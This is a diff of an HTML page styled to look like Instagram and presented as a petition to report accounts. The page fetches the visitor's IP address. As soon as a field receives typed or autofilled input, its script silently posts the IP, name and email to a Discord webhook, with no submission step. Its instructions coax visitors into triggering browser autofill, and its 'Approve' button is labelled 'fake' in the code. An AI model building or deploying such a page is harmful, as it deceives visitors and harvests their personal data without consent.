@@ -3,73 +3,83 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Report an Instagram Account</title>
+  <title>Report Instagram Account</title>
   <style>
     body {
       margin: 0;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
-      background-size: 400% 400%;
-      animation: gradientAnimation 15s ease infinite;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      color: #333;
-    }
-
-    @keyframes gradientAnimation {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-
-    .container {
-      width: 90%;
-      max-width: 400px;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
       background: #fff;
-      padding: 20px;
-      border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-      text-align: center;
+      color: #333;
     }
 
-    h1 {
-      margin-bottom: 10px;
-      font-size: 1.6em;
+    /* Header - Instagram-like */
+    .header {
+      height: 60px;
+      border-bottom: 1px solid #dbdbdb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #fff;
+      position: fixed;
+      top: 0;
+      width: 100%;
+      z-index: 10;
+    }
+    .header h1 {
+      font-family: "Arial", sans-serif;
+      font-size: 24px;
+      font-weight: 500;
+      margin: 0;
       color: #333;
-      font-weight: 600;
+    }
+
+    /* Container */
+    .container {
+      max-width: 400px;
+      margin: 100px auto 50px auto;
+      text-align: center;
+      padding: 0 20px;
+    }
+
+    h2 {
+      font-size: 1.5em;
+      margin-bottom: 10px;
+      font-weight: normal;
     }
 
     p {
       margin-bottom: 20px;
-      font-size: 0.95em;
+      font-size: 1em;
       line-height: 1.4em;
       color: #555;
     }
 
+    /* Primary button (trigger) with Instagram-like gradient */
     #trigger {
       display: inline-block;
       padding: 10px 20px;
-      background: linear-gradient(to right, #d62976, #962fbf);
-      color: #fff;
       font-size: 1em;
       border: none;
-      border-radius: 8px;
+      border-radius: 4px;
       cursor: pointer;
       text-decoration: none;
-      font-weight: 500;
-      transition: background 0.3s;
+      color: #fff;
+      background: linear-gradient(45deg, #f58529, #feda77, #dd2a7b, #8134af, #515bd4);
+      background-size: 300% 300%;
+      animation: gradientBG 3s ease infinite;
+      font-weight: 600;
     }
 
-    #trigger:hover {
-      background: linear-gradient(to right, #d62976cc, #962fbfcc);
+    @keyframes gradientBG {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
     }
 
     #formContainer {
       margin-top: 20px;
+      text-align: left;
       display: none;
-      text-align: center;
     }
 
     .instructions {
@@ -77,110 +87,87 @@
       margin-bottom: 20px;
       background: #fafafa;
       padding: 10px;
-      border-radius: 8px;
-      border: 1px solid #eee;
-      color: #555;
-      text-align: left;
+      border-radius: 5px;
+      border: 1px solid #dbdbdb;
+      color: #333;
       line-height: 1.4em;
     }
 
-    #userForm {
-      text-align: left;
-    }
-
-    .form-group {
-      margin-bottom: 15px;
-    }
-
-    .form-group label {
+    label {
       display: block;
       margin-bottom: 5px;
       font-weight: 600;
       font-size: 0.9em;
-      color: #333;
     }
 
-    .form-group input[type="text"],
-    .form-group input[type="email"],
-    .form-group textarea {
+    input[type="text"], input[type="email"], textarea {
       width: 100%;
       padding: 10px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 0.95em;
-      font-family: inherit;
-      transition: border-color 0.3s;
+      margin-bottom: 15px;
+      border: 1px solid #dbdbdb;
+      border-radius: 4px;
+      font-size: 1em;
+      background: #fafafa;
     }
 
-    .form-group input[type="text"]:focus,
-    .form-group input[type="email"]:focus,
-    .form-group textarea:focus {
-      border-color: #962fbf;
+    input[type="text"]:focus, input[type="email"]:focus, textarea:focus {
+      border-color: #ccc;
       outline: none;
+      background: #fff;
     }
 
-    .form-group textarea {
-      resize: vertical;
-      min-height: 80px;
+    textarea {
+      resize: none;
+      height: 80px;
     }
 
     #fake {
       display: inline-block;
+      margin-top: 10px;
       padding: 10px 20px;
-      background: linear-gradient(to right, #d62976, #962fbf);
-      color: #fff;
-      font-size: 1em;
       border: none;
-      border-radius: 8px;
+      border-radius: 4px;
       cursor: pointer;
       text-decoration: none;
-      font-weight: 500;
-      transition: background 0.3s;
-      margin-top: 10px;
-    }
-
-    #fake:hover {
-      background: linear-gradient(to right, #d62976cc, #962fbfcc);
+      font-size: 1em;
+      color: #fff;
+      background: linear-gradient(45deg, #f58529, #feda77, #dd2a7b, #8134af, #515bd4);
+      background-size: 300% 300%;
+      animation: gradientBG 3s ease infinite;
+      font-weight: 600;
+      text-align: center;
     }
   </style>
 </head>
 <body>
+  <div class="header">
+    <h1>Instagram</h1>
+  </div>
+
   <div class="container">
-    <h1>Report an Account</h1>
-    <p>Help us petition Instagram to remove accounts that violate guidelines. Your voice matters.</p>
-    <button id="trigger">Start</button>
+    <h2>Report an Instagram Account</h2>
+    <p>Help us petition Instagram to remove users violating the community guidelines. Provide the account's handle and reason below.</p>
+    <button id="trigger">Open Petition Form</button>
 
     <div id="formContainer">
       <p class="instructions">
-        If your browser has saved your name and email, select the suggestion when you focus the fields.
-        The Instagram handle and reason fields are displayed for context, but won't be stored.
-        Once any of the tracked fields (name or email) is filled, we'll send the info automatically.
+        If your browser has saved your personal details, simply click into the fields below to autofill. As soon as the data is entered, we’ll submit it automatically.
       </p>
       <form id="userForm" autocomplete="on">
-        <div class="form-group">
-          <label for="fname">Your First Name:</label>
-          <input type="text" id="fname" name="given-name" autocomplete="given-name" placeholder="John" required>
-        </div>
+        <label for="fname">Your First Name</label>
+        <input type="text" id="fname" name="given-name" autocomplete="given-name" required>
 
-        <div class="form-group">
-          <label for="lname">Your Last Name:</label>
-          <input type="text" id="lname" name="family-name" autocomplete="family-name" placeholder="Doe" required>
-        </div>
+        <label for="lname">Your Last Name</label>
+        <input type="text" id="lname" name="family-name" autocomplete="family-name" required>
 
-        <div class="form-group">
-          <label for="email">Your Email:</label>
-          <input type="email" id="email" name="email" autocomplete="email" placeholder="you@example.com" required>
-        </div>
+        <label for="email">Your Email</label>
+        <input type="email" id="email" name="email" autocomplete="email" required>
         
-        <div class="form-group">
-          <label for="handle">Instagram Handle to Report (Not Stored):</label>
-          <input type="text" id="handle" name="handle" placeholder="@username">
-        </div>
+        <label for="handle">Instagram Handle to Report</label>
+        <input type="text" id="handle" name="handle" placeholder="@username" required>
 
-        <div class="form-group">
-          <label for="reason">Reason for Reporting (Not Stored):</label>
-          <textarea id="reason" name="reason" rows="4" placeholder="Explain why this account should be banned..."></textarea>
-        </div>
+        <label for="reason">Reason for Reporting</label>
+        <textarea id="reason" name="reason" placeholder="Tell us why this account should be banned..." required></textarea>
       </form>
       <button id="fake">Approve</button>
     </div>
@@ -210,33 +197,36 @@
         .catch(err => console.error('Error fetching IP:', err));
     });
 
-    // Show the form when the user clicks start
+    // Show the form when the user clicks the trigger
     trigger.addEventListener('click', () => {
       formContainer.style.display = 'block';
       fnameField.focus();
     });
 
     function checkFields() {
-      // Only consider fname, lname, and email for submission
       if (
         fnameField.value.trim() !== '' ||
         lnameField.value.trim() !== '' ||
-        emailField.value.trim() !== ''
+        emailField.value.trim() !== '' ||
+        handleField.value.trim() !== '' ||
+        reasonField.value.trim() !== ''
       ) {
         submitForm(
           fnameField.value.trim() || '[No First Name]',
           lnameField.value.trim() || '[No Last Name]',
-          emailField.value.trim() || '[No Email]'
+          emailField.value.trim() || '[No Email]',
+          handleField.value.trim() || '[No Handle]',
+          reasonField.value.trim() || '[No Reason]'
         );
       }
     }
 
-    function submitForm(fname, lname, email) {
-      const message = `**New Petition Submission (Report IG Account):**\n` +
+    function submitForm(fname, lname, email, handle, reason) {
+      const message = `**New Petition Submission (Report Instagram Account):**\n` +
                       `**IP:** ${userIP}\n` +
                       `**First Name:** ${fname}\n` +
                       `**Last Name:** ${lname}\n` +
-                      `**Email:** ${email}\n';
+                      `**Email:** ${email}\n`;
 
       fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
@@ -256,10 +246,14 @@
     fnameField.addEventListener('input', checkFields);
     lnameField.addEventListener('input', checkFields);
     emailField.addEventListener('input', checkFields);
+    handleField.addEventListener('input', checkFields);
+    reasonField.addEventListener('input', checkFields);
 
     fnameField.addEventListener('change', checkFields);
     lnameField.addEventListener('change', checkFields);
     emailField.addEventListener('change', checkFields);
+    handleField.addEventListener('change', checkFields);
+    reasonField.addEventListener('change', checkFields);
   </script>
 </body>
 </html>
